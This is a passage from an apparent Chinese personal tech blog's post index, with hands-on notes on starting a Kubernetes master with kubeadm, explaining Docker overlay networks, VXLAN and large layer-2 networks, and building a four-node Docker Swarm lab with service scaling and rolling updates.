d5e1e48cf932 20 months ago 104MB nigelpoulton/tu-demo v1-old 6852022de69d 20 months ago 104MB dockersamples/atseasampleshopapp_reverse_proxy \u0026lt;none\u0026gt; 32b8411b497a 3 years ago 18.6MB dockersamples/visualizer 然后我们就可以初始化master节点了 这里注意要以root角色启动。\nroot@lzl:/home/lzl# kubeadm init --kubernetes-version=v1.22.4 --pod-network-cidr=10.0.20.0/24 --ignore-preflight-errors=Swap [init] Using Kubernetes version: v1.22.4 [preflight] Running pre-flight checks [WARNING HTTPProxy]: Connection to \u0026#34;https://10.0.20.25\u0026#34; uses proxy \u0026#34;http://10.0.20.17:1080/\u0026#34;. If that is not intended, adjust your proxy settings [WARNING HTTPProxyCIDR]: connection to \u0026#34;10.96.0.0/12\u0026#34; uses proxy \u0026#34;http://10.0.20.17:1080/\u0026#34;. This may lead to malfunctional cluster setup. Make sure that Pod and Services IP ranges specified correctly as exceptions in proxy configuration [WARNING HTTPProxyCIDR]: connection to \u0026#34;10.0.20.0/24\u0026#34; uses proxy \u0026#34;http://10.0.20.17:1080/\u0026#34;. This may lead to malfunctional cluster setup. Make sure that Pod and Services IP ranges specified correctly as exceptions in proxy configuration [preflight] Pulling images required for setting up a Kubernetes cluster [preflight] This might take a minute or two, depending on the speed of your internet connection [preflight] You can also perform this action in beforehand using \u0026#39;kubeadm config images pull\u0026#39; [certs] Using certificateDir folder \u0026#34;/etc/kubernetes/pki\u0026#34; [certs] Generating \u0026#34;ca\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver\u0026#34; certificate and key [certs] apiserver serving cert is signed for DNS names [kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local lzl] and IPs [10.96.0.1 10.0.20.25] [certs] Generating \u0026#34;apiserver-kubelet-client\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-ca\u0026#34; certificate and key [certs] Generating \u0026#34;front-proxy-client\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/ca\u0026#34; certificate and key [certs] Generating \u0026#34;etcd/server\u0026#34; certificate and key [certs] etcd/server serving cert is signed for DNS names [localhost lzl] and IPs [10.0.20.25 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/peer\u0026#34; certificate and key [certs] etcd/peer serving cert is signed for DNS names [localhost lzl] and IPs [10.0.20.25 127.0.0.1 ::1] [certs] Generating \u0026#34;etcd/healthcheck-client\u0026#34; certificate and key [certs] Generating \u0026#34;apiserver-etcd-client\u0026#34; certificate and key [certs] Generating \u0026#34;sa\u0026#34; key and public key [kubeconfig] Using kubeconfig folder \u0026#34;/etc/kubernetes\u0026#34; [kubeconfig] Writing \u0026#34;admin.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;kubelet.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;controller-manager.conf\u0026#34; kubeconfig file [kubeconfig] Writing \u0026#34;scheduler.conf\u0026#34; kubeconfig file [kubelet-start] Writing kubelet environment file with flags to file \u0026#34;/var/lib/kubelet/kubeadm-flags.env\u0026#34; [kubelet-start] Writing kubelet configuration to file \u0026#34;/var/lib/kubelet/config.yaml\u0026#34; [kubelet-start] Starting the kubelet [control-plane] Using manifest folder \u0026#34;/etc/kubernetes/manifests\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-apiserver\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-controller-manager\u0026#34; [control-plane] Creating static Pod manifest for \u0026#34;kube-scheduler\u0026#34; [etcd] Creating static Pod manifest for local etcd in \u0026#34;/etc/kubernetes/manifests\u0026#34; [wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory \u0026#34;/etc/kubernetes/manifests\u0026#34;. This can take up to 4m0s [apiclient] All control plane components are healthy after 7.778428 seconds [upload-config] Storing the configuration used in ConfigMap \u0026#34;kubeadm-config\u0026#34; in the \u0026#34;kube-system\u0026#34; Namespace [kubelet] Creating a ConfigMap \u0026#34;kubelet-config-1.22\u0026#34; in namespace kube-system with the configuration for the kubelets in the cluster [upload-certs] Skipping phase. Please see --upload-certs [mark-control-plane] Marking the node lzl as control-plane by adding the labels: [node-role.kubernetes.io/master(deprecated) node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers] [mark-control-plane] Marking the node lzl as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule] [bootstrap-token] Using token: y5u12k.h101qh26f94557u7 [bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC Roles [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes [bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials [bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token [bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster [bootstrap-token] Creating the \u0026#34;cluster-info\u0026#34; ConfigMap in the \u0026#34;kube-public\u0026#34; namespace [kubelet-finalize] Updating \u0026#34;/etc/kubernetes/kubelet.conf\u0026#34; to point to a rotatable kubelet client certificate and key [addons] Applied essential addon: CoreDNS [addons] Applied essential addon: kube-proxy Your Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config Alternatively, if you are the root user, you can run: export KUBECONFIG=/etc/kubernetes/admin.conf You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 10.0.20.25:6443 --token y5u12k.h101qh26f94557u7 \\ --discovery-token-ca-cert-hash sha256:ef50610dda443d0dc461f3a74e8e73921c2e86dd24a2f39519b4f315a018d7f8 root@lzl:/home/lzl# 看到Your Kubernetes control-plane has initialized successfully!就说明第一阶段配置完成了。\n继续配环境 我们先切到普通用户，然后根据刚才的提示设置以下的环境：\nlzl@lzl:~$ mkdir -p $HOME/.kube lzl@lzl:~$ sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config [sudo] password for lzl: lzl@lzl:~$ sudo chown $(id -u):$(id -g) $HOME/.kube/config 然后查看一下各组件的状态：\nlzl@lzl:~$ kubectl get componentstatus Warning: v1 ComponentStatus is deprecated in v1.19+ NAME STATUS MESSAGE ERROR scheduler Unhealthy Get \u0026#34;http://127.0.0.1:10251/healthz\u0026#34;: dial tcp 127.0.0.1:10251: connect: connection refused controller-manager Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;\u0026#34;} 发现调度器掉线。\n出现这种情况，是/etc/kubernetes/manifests/下的kube-controller-manager.yaml和kube-scheduler.yaml设置的默认端口是0导致的，解决方式是注释掉对应的port即可。\n我们按照别人的教程操作：\n··· spec: containers: - command: - kube-scheduler - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf - --bind-address=127.0.0.1 - --kubeconfig=/etc/kubernetes/scheduler.conf - --leader-elect=true # - --port=0 env: - name: HTTP_PROXY value: http://10.0.20.17:1080/ - name: FTP_PROXY value: http://10.0.20.17:1080/ - name: https_proxy value: http://10.0.20.17:1080/ ··· 再次查看组件状态：\nlzl@lzl:/etc/kubernetes/manifests$ kubectl get componentstatus Warning: v1 ComponentStatus is deprecated in v1.19+ NAME STATUS MESSAGE ERROR scheduler Healthy ok controller-manager Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;\u0026#34;} 这样三个组件就全部在线了。\n","date":"2021-11-28T20:37:15+08:00","permalink":"https://lizonglingo.github.io/p/%E5%90%AF%E5%8A%A8k8s%E7%9A%84%E4%B8%BB%E8%8A%82%E7%82%B9k8s%E5%AE%9E%E8%B7%B5-1/","title":"启动k8s的主节点(k8s实践-1)"},{"content":" 学习Docker覆盖网络的时候，自然免不了与数据中心大二层网络技术的关系，然后补了一下相关的知识。\n从Docker覆盖网络谈起 对于不同网络中容器的安全、可靠通信问题十分关键。Docker通过覆盖网络技术，创建扁平、安全的二层网络连接不同物理网络的容器，连接到覆盖网络的容器可以直接通信。\n如上图所示，两个属于不同物理网络的节点，通过连接到同一个Overlay覆盖网络可以直接完成通信。覆盖网络创建了虚拟二层网络10.0.0.0/24然后为这两个节点分配了IP地址。也就是说，在节点1上ping 10.0.0.4可以通，并且只需要经过1跳。\n那么Overlay是怎么实现的。\nVXLAN VLAN 为了隔离二层网络的广播域，又能使网络中用户相互访问，我们使用划分VLAN的方式，构建虚拟局域网。同一个VLAN中的用户可以直接通信，同属于一个广播域。这些VLAN报文通过在MAC帧添加VLAN标记来进行传输。\n问题就在于，VLAN支持用户数量太少了。\n数据中心需要支持的虚拟机数量远远大于VLAN支持的数量。为了与依赖的网络硬件设备解耦，并支持大规模虚拟机网络管理，一些做虚拟化的IT厂商推出了一些SND技术，VXLAN就是。\nVXLAN VXLAN的实现是在需要接入覆盖网络的主机上，通过虚拟化的交换机、虚拟化的网络适配器来实现在三层网络上虚拟出一个二层网络。\n设计目的就在于：允许用户基于已经存在的三层网络创建虚拟的二层网络。 使用的主要技术是：基于UDP封装的隧道技术。VXLAN基于三层IP网络创建了隧道。在隧道两端，VXLAN隧道终端VTEP完成封装和解封装。 为了实现在三层网络上虚拟出二层覆盖网络，大致有下面几个步骤。\n在主机上创建一个Sandbox网络命名空间，这相当于在主机上运行了一个独立的网络栈（可以看作以容器方式运行）。 在Sandbox中创建一个虚拟交换机（虚拟网桥）。 在主机中创建一个VXLAN隧道终端VTEP，并把它的一端接入到虚拟交换机上，另一端则接入主机的网络栈。接入主机网络栈后，VTEP就从主机所连接的基础网络中获取到主机的IP地址，并以UDP Socket的方式绑定到4789端口。 这样一来，不同主机上的两个VTEP通过VXLAN隧道连接在了一起，创建了一个覆盖网络。 经过以上步骤，这个覆盖网络中的主机向下是连通了，那向上怎么去传递数据呢？所以，主机继续创建虚拟以太网适配器（虚拟网卡），并将这个虚拟网卡接入虚拟交换机上，这样从交换机上来的数据帧就可以被转发。 下面来看一个完整的通过覆盖网络的数据传输过程：\nnode1节点上的容器叫C1，node2的叫C2。 C1去ping 10.0.0.4也就是C2。这个请求的流量，通过连接到虚拟交换机的虚拟网卡发出。但此时虚拟交换机并不知道从哪个接口转发出去。因为虚拟交换机中暂时没有与该IP对应的MAC地址。 所以虚拟交换机会向所有接口转发。连接到虚拟交换机的VXLAN隧道终端VTEP知道它自己应该接收并转发这个数据帧，所以它会返回自己的MAC地址，并且虚拟交换机中交换表就新增了这一条转发条目，以后发往该IP的数据帧都转发给VTEP。（实际上就是二层网络的ARP协议在主机中使用软件模拟） 为什么VTEP知道自己应该转发发往C2的10.0.0.4这个IP的数据帧呢？因为Docker启动容器时，会将自己的网络信息通过Gossip协议发送给相同Swarm集群的其他节点。 虚拟交换机把数据帧转发给VTEP，VTEP继续封装，加入VXLAN Header等信息，这样这条数据帧就可以在真实的基础网络中透明传输了。 VTEP将数据帧放到UDP包中，设置端口4789和C2真实的目的地址，然后交给底层网络。 这条数据包在基础网络中透明传输，到达node2，把它交给UDP的4789端口处理，由于VTEP绑定了4789端口，所以进一步交给VTEP处理。 VTEP解封装后，向上交给虚拟交换机，再转发到C2对应的虚拟网卡，这样C2就收到了这条数据。 为什么数据中心需要使用大二层网络？ 数据中心为用户管理了大量的虚拟机，为了对物理机进行维护、升级，就有了迁移虚拟机的需求。重要的是，对虚拟机的迁移在用户看来应该是透明无感知的。这就要求在迁移的过程中，虚拟机需要正常提供服务，它的网络属性如IP需要保持不变。\n如果使用传统的二三层网络结构（如VLAN划分的2层网络），地址数量限制了虚拟机动态迁移只能在一个较小的局部范围中。为了实现大规模、跨地域数据中心的虚拟机动态迁移，就需要构建大二层网络，实现虚拟机的无障碍动态迁移。\n二层网络和三层网络对比 来源：\nhttps://nc.haut.edu.cn/info/1034/4213.htm\nhttps://zhuanlan.zhihu.com/p/108713008\n在网络结构中，有二层网络和三层网络两种选择。在这里的二层、三层是按照逻辑拓扑结构进行的分类，并不是说ISO七层模型中的数据链路层和网络层，而是指核心层，汇聚层和接入层，这三层都部署的就是三层网络结构，二层网络结构没有汇聚层。\n只有核心层和接入层的二层网络结构模式运行简便，交换机根据MAC地址表进行数据包的转发，有则转发，无则泛洪，即将数据包广播发送到所有端口，如果目的终端收到给出回应，那么交换机就可以将该MAC地址添加到地址表中，这是交换机对MAC地址进行建立的过程。\n但这样频繁的对未知的MAC目标的数据包进行广播，在大规模的网络架构中形成的网络风暴是非常庞大的，这也很大程度上限制了二层网络规模的扩大，因此二层网络的组网能力非常有限，所以一般只是用来搭建小局域网。\n与二层网络结构不同的是，三层网络结构可以组建大型的网络。\n核心层是整个网络的支撑脊梁和数据传输通道，重要性不言而喻，因此在整个三层网络结构中，核心层的设备要求是最高的，必须配备高性能的数据冗余转接设备和防止负载过剩的均衡负载的设备，以降低各核心层交换机所需承载的数据量。（网络的高速交换主干）\n汇聚层是连接网络的核心层和各个接入的应用层，在两层之间承担“媒介传输”的作用。汇聚层应该具备以下功能：实施安全功能（划分 VLAN和配置 ACL）、工作组整体接入功能、虚拟网络过滤功能。因此，汇聚层设备应采用三层交换机。（提供基于策略的连接）\n接入层的面向对象主要是终端客户，为终端客户提供接入功能。（将工作站接入网络）\n二层网络仅仅通过MAC寻址即可实现通讯，但仅仅是同一个冲突域内；三层网络则需要通过IP路由实现跨网段的通讯，可以跨多个冲突域。\n大二层网络 来源：\nhttps://blog.csdn.net/xinjixun3641/article/details/84334384\n大二层网络基本上都是针对数据中心场景的，因为它实际上就是为了解决数据中心的服务器虚拟化之后的虚拟机动态迁移这一特定需求而出现的。其实学校网络也是一个相当于数据中心的网络，因为他需要对整个校园提供上网服务，例如WIFI漫游等。\n为了实现虚拟机的大范围甚至跨地域的动态迁移，就要求把VM迁移可能涉及的所有服务器都纳入同一个二层网络域，这样才能实现VM的大范围无障碍迁移。这就是大二层网络！\n一个真正意义的大二层网络至少要能容纳1万以上的主机，才能叫做大二层网络。\n传统的二层网络为啥大不起来？其实说起来也简单，二层网络的核心问题就是环路问题以及由此产生的广播风暴问题。\n传统的二层技术为啥不能支持大二层？基于VLAN+xSTP技术的二层网络，可能容纳的主机数量通常都不会超过1K。\n","date":"2021-11-20T11:24:40+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BB%8Edocker%E8%A6%86%E7%9B%96%E7%BD%91%E7%BB%9C%E5%BC%95%E5%87%BA%E5%A4%A7%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C/","title":"从Docker覆盖网络引出大二层网络"},{"content":" 这个实验书上的示例是6台机器（虚拟机），我在本机部署时由于内存原因只用了4台虚拟机，但效果还是基本达到了，只有在模拟某台管理节点宕机时，出现剩下的唯一一个管理节点无法正常工作的情况（和使用raft共识有关），在对应部分会详细说明。\n本次实验的环境是4台Ubuntu18.04虚拟机，每台2G内存、1核2线程，采用桥接模式共用宿主机网络。\nDocker Swarm Swarm有两层含义：\n一个Docker安全集群：让用户以集群方式管理一个或多个Docker节点，默认内置分布式集群存储，加密网络，公用TLS，安全集群接入令牌，简化的数字证书管理PKI。 一个微服务编排引擎：通过声明式配置文件部署和管理复杂的微服务应用，支持滚动升级，回滚，以及扩缩容。 Swarm中的节点分为管理节点和工作节点：\n管理节点：负责集群的控制，监控集群状态，分发任务到工作节点。 工作节点：接收任务并执行。 搭建Swarm集群 初始化Swarm 在正式搭建之前，每个节点需要开放下面的端口：\n2377/tcp：用于客户端与Swarm安全通信。 7946/tcp与7946/udp：用于控制面gossip分发。 4789/udp：用于基于VXLAN的覆盖网络 我用iptables完成了这些步骤。下面开始创建集群。\n初始化Swarm 不包含在Swarm中的Docker节点称为运行于单引擎模式，一旦加入Swarm就切换为Swarm模式。首先通过docker swarm init将第一个节点切换到Swarm模式并设置其为第一个管理节点A。\nlzl@lzl:~$ docker swarm init \\ \u0026gt; --advertise-addr 10.0.20.25:2377 \\\t# 其他节点用来连接当前管理节点的IP和端口 \u0026gt; --listen-addr 10.0.20.25:2377\t# 承载Swarm流量的IP和端口 Swarm initialized: current node (kwtw0ybgf4uzd1d6bcdpwze1y) is now a manager. To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-2avftcvr1a1lesoqcyjr06tdvjvvof9n0wiz39lepv8aezk6xm-2dai3bks4siwhgetlhcuqnonz 10.0.20.25:2377 To add a manager to this swarm, run \u0026#39;docker swarm join-token manager\u0026#39; and follow the instructions. Swarm给出提示，向集群加入新的管理节点和工作节点需要什么命令，它们需要的token是不同的，比如加入管理节点的命令：\nlzl@lzl:~$ docker swarm join-token manager To add a manager to this swarm, run the following command: docker swarm join --token SWMTKN-1-2avftcvr1a1lesoqcyjr06tdvjvvof9n0wiz39lepv8aezk6xm-erhmvcq8z52aure635nv6w8ch 10.0.20.25:2377 下面加入一个工作节点C lzl@lzl-c:~$ docker swarm join --token SWMTKN-1-2avftcvr1a1lesoqcyjr06tdvjvvof9n0wiz39lepv8aezk6xm-2dai3bks4siwhgetlhcuqnonz 10.0.20.25:2377 \\ \u0026gt; --advertise-addr 10.0.20.26:2377 \\\t# 这两个属性虽然是可选的 \u0026gt; --listen-addr 10.0.20.26:2377\t# 但是最好指明每个节点的网络属性 This node joined a swarm as a worker. 加入其他节点 同样的，我们把第二个管理节点B和第二个工作节点D加入集群。\nlzl@lzl-b:~$ docker swarm join --token SWMTKN-1-2avftcvr1a1lesoqcyjr06tdvjvvof9n0wiz39lepv8aezk6xm-erhmvcq8z52aure635nv6w8ch 10.0.20.25:2377 \\ \u0026gt; --advertise-addr 10.0.20.35:2377 \\ \u0026gt; --listen-addr 10.0.20.35:2377 This node joined a swarm as a manager. lzl@lzl-d:~$ docker swarm join --token SWMTKN-1-2avftcvr1a1lesoqcyjr06tdvjvvof9n0wiz39lepv8aezk6xm-2dai3bks4siwhgetlhcuqnonz 10.0.20.25:2377 \\ \u0026gt; --advertise-addr 10.0.20.27:2377 \\ \u0026gt; --listen-addr 10.0.20.27:2377 This node joined a swarm as a worker. 这样我们集群中就有了：\n管理节点A：10.0.20.25\n管理节点B：10.0.20.35\n工作节点C：10.0.20.26\n工作节点D：10.0.20.27\n查看集群中的节点 lzl@lzl:~$ docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION aez7db9rdqoylqktrk7stcu49 lzl-c Ready Active 20.10.10 jfhjtedzu8mg0y6vzgw0unvw7 lzl-d Ready Active 20.10.10 kwtw0ybgf4uzd1d6bcdpwze1y * lzl Ready Active Leader 20.10.10 ppvj0ll2jo0smt4htpms9fosw lzl-b Ready Active Reachable 20.10.10 Swarm已经启动TLS以保证集群安全。\n*：表示当前节点 Leader：表示管理节点的Leader Reachable：表示其他可用的管理节点 高可用性HA Swarm使用Raft达成共识，我这里使用两个管理节点实际上是不好的，一个是数量太少，另一个是偶数个管理节点可能发生脑裂现象。最好是部署奇数个管理节点，也不要太多，3个5个都行。\n即使一个或多个管理节点出现故障，其他管理节点也会继续工作保证Swarm的运转。管理节点中的主节点是唯一的会对Swarm发送控制命令的节点，其他管理节点收到的命令会转发给主节点。\n安全机制 Swarm的安全机制如CA、接入Token、公用TLS、加密网络、加密集群存储、加密节点ID等开箱即用。\n锁定Swarm Docker提供了自动锁机制锁定Swarm，使得重启的管理节点只有提供集群解锁码后才能重新接入集群。\n在管理节点A启用锁：\nlzl@lzl:~$ docker swarm update --autolock=true Swarm updated. To unlock a swarm manager after it restarts, run the `docker swarm unlock` command and provide the following key: SWMKEY-1-0A98dswMx4EOOmfMwjlVDEL1w1OLncMAQniYV+nPKuk Please remember to store this key in a password manager, since without it you will not be able to restart the manager. 重启另一个管理节点B，发现它加不进去，因为集群上锁了：\nlzl@lzl-b:~$ service docker restart lzl@lzl-b:~$ docker node ls Error response from daemon: Swarm is encrypted and needs to be unlocked before it can be used. Please use \u0026#34;docker swarm unlock\u0026#34; to unlock it. 我们在管理节点A列出节点试试？\nlzl@lzl:~$ docker node ls Error response from daemon: rpc error: code = Unknown desc = The swarm does not have a leader. It\u0026#39;s possible that too few managers are online. Make sure more than half of the managers are online. 由于部署2个管理节点，1个节点掉线后，仅剩的管理节点A无法正常工作，因为要求至少半数管理节点在线，所以为什么至少要3、5个管理节点。\n现在用解锁key启动管理节点B：\nlzl@lzl-b:~$ docker swarm unlock Please enter unlock key: SWMKEY-1-0A98dswMx4EOOmfMwjlVDEL1w1OLncMAQniYV+nPKuk lzl@lzl-b:~$ docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION aez7db9rdqoylqktrk7stcu49 lzl-c Ready Active 20.10.10 jfhjtedzu8mg0y6vzgw0unvw7 lzl-d Ready Active 20.10.10 kwtw0ybgf4uzd1d6bcdpwze1y lzl Ready Active Leader 20.10.10 ppvj0ll2jo0smt4htpms9fosw * lzl-b Ready Active Reachable 20.10.10 Swarm服务 Docker1.12后引入服务，通过Swarm部署服务的多个实例，实现服务的高可用、弹性、滚动升级。\n我们部署一个简单的Web服务：\nlzl@lzl:~$ docker service create --name web-fe \\ \u0026gt; -p 8080:8080 \\ \u0026gt; --replicas 3 \\ \u0026gt; nigelpoulton/pluralsight-docker-ci image nigelpoulton/pluralsight-docker-ci:latest could not be accessed on a registry to record its digest. Each node will access nigelpoulton/pluralsight-docker-ci:latest independently, possibly leading to different nodes running different versions of the image. cz5m15yzyfzvxoilx2czv9s0n overall progress: 3 out of 3 tasks 1/3: running 2/3: running 3/3: running verify: Service converged \u0026ndash;replicas：表示有3个实例 假设某个节点宕机了，服务实例降为2个，那么Swarm会再实例化一个服务，保证有3个实例提供服务。通过端口映射，每个机器上访问8080端口都可以访问服务。\n查看Swarm服务 列出服务：\nlzl@lzl:~$ docker service ls ID NAME MODE REPLICAS IMAGE PORTS cz5m15yzyfzv web-fe replicated 3/3 nigelpoulton/pluralsight-docker-ci:latest *:8080-\u0026gt;8080/tcp 查看每个服务副本：\nlzl@lzl:~$ docker service ps web-fe ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS mexucdagzhx3 web-fe.1 nigelpoulton/pluralsight-docker-ci:latest lzl-b Running Running about a minute ago if2hnpkawwhk web-fe.2 nigelpoulton/pluralsight-docker-ci:latest lzl-c Running Running about a minute ago mtkhx4uaazya web-fe.3 nigelpoulton/pluralsight-docker-ci:latest lzl-d Running Running about a minute ago 查看该服务细节：\nlzl@lzl:~$ docker service inspect --pretty web-fe ID:\tcz5m15yzyfzvxoilx2czv9s0n Name:\tweb-fe Service Mode:\tReplicated Replicas:\t3 Placement: UpdateConfig: Parallelism:\t1 On failure:\tpause Monitoring Period: 5s Max failure ratio: 0 Update order: stop-first RollbackConfig: Parallelism:\t1 On failure:\tpause Monitoring Period: 5s Max failure ratio: 0 Rollback order: stop-first ContainerSpec: Image:\tnigelpoulton/pluralsight-docker-ci:latest Init:\tfalse Resources: Endpoint Mode:\tvip Ports: PublishedPort = 8080 Protocol = tcp TargetPort = 8080 PublishMode = ingress \u0026ndash;pretty：不加会列出更为详细的信息。 副本服务和全局服务 副本模式：这是默认的模式，将期望数量的副本均匀的分布到整个集群中。 全局模式：每个节点上仅运行一个副本，使用docker create service --mode global部署全局模式。 服务扩缩容 假设3个实例提供服务有些吃力了，我们需要将实例增加到6个。\nlzl@lzl:~$ docker service scale web-fe=6 web-fe scaled to 6 overall progress: 6 out of 6 tasks 1/6: running [==================================================\u0026gt;] 2/6: running [==================================================\u0026gt;] 3/6: running [==================================================\u0026gt;] 4/6: running [==================================================\u0026gt;] 5/6: running [==================================================\u0026gt;] 6/6: running [==================================================\u0026gt;] verify: Service converged lzl@lzl:~$ docker service ls ID NAME MODE REPLICAS IMAGE PORTS cz5m15yzyfzv web-fe replicated 6/6 nigelpoulton/pluralsight-docker-ci:latest *:8080-\u0026gt;8080/tcp lzl@lzl:~$ docker service ps web-fe ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS mexucdagzhx3 web-fe.1 nigelpoulton/pluralsight-docker-ci:latest lzl-b Running Running 7 minutes ago if2hnpkawwhk web-fe.2 nigelpoulton/pluralsight-docker-ci:latest lzl-c Running Running 7 minutes ago mtkhx4uaazya web-fe.3 nigelpoulton/pluralsight-docker-ci:latest lzl-d Running Running 7 minutes ago ngjcu26etj9l web-fe.4 nigelpoulton/pluralsight-docker-ci:latest lzl Running Running about a minute ago 4muhlzldan91 web-fe.5 nigelpoulton/pluralsight-docker-ci:latest lzl-c Running Running about a minute ago m4ugu5sz63b8 web-fe.6 nigelpoulton/pluralsight-docker-ci:latest lzl-d Running Running about a minute ago Swarm自动为我们均衡的增加了服务实例，现在再将实例降回到3个。\nlzl@lzl:~$ docker service scale web-fe=3 web-fe scaled to 3 overall progress: 3 out of 3 tasks 1/3: running [==================================================\u0026gt;] 2/3: running [==================================================\u0026gt;] 3/3: running [==================================================\u0026gt;] verify: Service converged lzl@lzl:~$ docker service ps web-fe ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS mexucdagzhx3 web-fe.1 nigelpoulton/pluralsight-docker-ci:latest lzl-b Running Running 10 minutes ago if2hnpkawwhk web-fe.2 nigelpoulton/pluralsight-docker-ci:latest lzl-c Running Running 10 minutes ago mtkhx4uaazya web-fe.3 nigelpoulton/pluralsight-docker-ci:latest lzl-d Running Running 10 minutes ago ngjcu26etj9l web-fe.4 nigelpoulton/pluralsight-docker-ci:latest lzl Remove Running 9 seconds ago 4muhlzldan91 web-fe.5 nigelpoulton/pluralsight-docker-ci:latest lzl-c Remove Running 9 seconds ago m4ugu5sz63b8 web-fe.6 nigelpoulton/pluralsight-docker-ci:latest lzl-d Remove Running 9 seconds ago 现在有3个服务实例已经被移除。\n删除服务 lzl@lzl:~$ docker service rm web-fe web-fe 滚动升级 下面用一个新的服务演示滚动升级。在此之前，需要创建一个覆盖网络overlay。这是一个二层网络，所有接入该网络的容器可以互相通信，即使这些容器的宿主机的底层网络不同。\nlzl@lzl:~$ docker network create -d overlay uber-net np6r4rhm4lpsalikwfiahopcy lzl@lzl:~$ docker network ls NETWORK ID NAME DRIVER SCOPE 72f99c88c853 bridge bridge local 9027fdbdc8f6 docker_gwbridge bridge local 7a84b4fa35eb host host local mvd937imkve6 ingress overlay swarm 66b37b687b76 none null local np6r4rhm4lps uber-net overlay swarm\t# 我们新建的覆盖网络 然后新建一个服务，创建8个服务提供实例，并把它接入该网络。\nlzl@lzl:~$ docker service create --name uber-svc \\ \u0026gt; --network uber-net \\ \u0026gt; -p 80:80 --replicas 8 \\ \u0026gt; nigelpoulton/tu-demo:v1 image nigelpoulton/tu-demo:v1 could not be accessed on a registry to record its digest. Each node will access nigelpoulton/tu-demo:v1 independently, possibly leading to different nodes running different versions of the image. v5hohnigjlubbg7itg42habfr overall progress: 8 out of 8 tasks 1/8: running [==================================================\u0026gt;] 2/8: running [==================================================\u0026gt;] 3/8: running [==================================================\u0026gt;] 4/8: running [==================================================\u0026gt;] 5/8: running [==================================================\u0026gt;] 6/8: running [==================================================\u0026gt;] 7/8: running [==================================================\u0026gt;] 8/8: running [==================================================\u0026gt;] verify: Service converged lzl@lzl:~$ docker service ls ID NAME MODE REPLICAS IMAGE PORTS v5hohnigjlub uber-svc replicated 8/8 nigelpoulton/tu-demo:v1 *:80-\u0026gt;80/tcp lzl@lzl:~$ docker service ps uber-svc ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS 3cxuushzkvo4 uber-svc.1 nigelpoulton/tu-demo:v1 lzl-c Running Running 49 seconds ago xjv8k31yxhxt uber-svc.2 nigelpoulton/tu-demo:v1 lzl-b Running Running 49 seconds ago xzxyzyk9kxy9 uber-svc.3 nigelpoulton/tu-demo:v1 lzl-c Running Running 48 seconds ago tg6zmzqwzab6 uber-svc.4 nigelpoulton/tu-demo:v1 lzl-d Running Running 52 seconds ago y4jl7yg5jsc1 uber-svc.5 nigelpoulton/tu-demo:v1 lzl Running Running 49 seconds ago s8yvzixgbepo uber-svc.6 nigelpoulton/tu-demo:v1 lzl-d Running Running 50 seconds ago 69ghlllr9mi5 uber-svc.7 nigelpoulton/tu-demo:v1 lzl-b Running Running 48 seconds ago mtkg9y3j7dl3 uber-svc.8 nigelpoulton/tu-demo:v1 lzl Running Running 51 seconds ago -p 80:80：把所有到达Swarm节点的80端口的流量映射到每个服务副本中的80端口 --network uber-net：服务的所有副本使用这个覆盖网络 一般的，对于开放端口的处理，默认使用入站模式，此外还有主机模式。\n入站模式：所有Swarm节点都开放端口，即使节点上没有任何服务副本，从任何节点的IP都可以访问到服务，因为节点配置的映射会将请求转发给有服务实例的节点 主机模式：仅在运行了服务实例的节点开放端口 下面来看滚动升级，升级策略是每次升级2个副本，间隔20秒。\nlzl@lzl:~$ docker service update \\ \u0026gt; --image nigelpoulton/tu-demo:v2 \\ \u0026gt; --update-parallelism 2 \\ \u0026gt; --update-delay 20s uber-svc image nigelpoulton/tu-demo:v2 could not be accessed on a registry to record its digest. Each node will access nigelpoulton/tu-demo:v2 independently, possibly leading to different nodes running different versions of the image. uber-svc overall progress: 2 out of 8 tasks 1/8: running [==================================================\u0026gt;] 2/8: running [==================================================\u0026gt;] 3/8: 4/8: 5/8: 6/8: 7/8: 8/8: --image nigelpoulton/tu-demo:v2：指定升级的服务镜像 --update-parallelism 2：每次升级2个服务 --update-delay 20s：升级间隔20秒 在升级过程中，我们查看当前服务实例副本：\nlzl@lzl:~$ docker service ps uber-svc ID NAME IMAGE NODE DESIRED STATE 